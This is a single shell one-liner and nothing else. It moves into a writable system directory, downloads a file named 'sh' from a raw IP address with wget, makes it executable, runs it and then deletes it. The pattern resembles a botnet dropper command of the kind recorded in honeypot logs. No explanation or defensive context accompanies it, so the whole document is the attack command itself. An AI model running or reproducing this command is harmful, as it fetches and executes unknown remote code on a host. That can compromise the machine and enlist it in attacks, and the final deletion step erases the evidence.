cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.165/sh; chmod +x sh; ./sh; rm -rf sh
